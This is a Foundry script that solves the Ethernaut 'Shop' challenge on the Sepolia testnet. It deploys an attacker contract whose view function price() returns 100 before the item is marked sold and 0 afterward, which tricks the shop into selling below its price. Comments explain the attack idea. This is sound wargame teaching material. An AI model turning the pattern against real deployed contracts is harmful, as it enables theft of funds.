// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Shop.sol";

interface Buyer {
    function price() external view returns (uint256);
}

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Shop.s.sol --tc ShopSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract ShopSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("SHOP_INSTANCE"));

    // attack idea: the price of the Shop contract is set to 100 and the isSold flag is set to false
    // we can create a new contract that implements the Buyer interface and have a price function that returns for the fisrt time 100
    // and for the second time 0, this way we can buy the shop for 100 and then for 0
    // notice that since it is a view function we can't change the state of the contract
    // we can change the return value of the price function base on the value of the flag isSold
    // if the flag is true we return 0 otherwise we return 100

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        BuyerContract buyerAttackContract = new BuyerContract(instance);
        // call the buy function
        buyerAttackContract.buy();
        vm.stopBroadcast();
    }
}

contract BuyerContract is Buyer {
    Shop public shopAddress;
    constructor(address _shopAddress){
        shopAddress = Shop(_shopAddress);
    }

    function price() external view returns (uint256){ 
        if (shopAddress.isSold() == true){
            return 0;
        }
        return 100;
    }

    function buy() public {
        shopAddress.buy();
    }
}



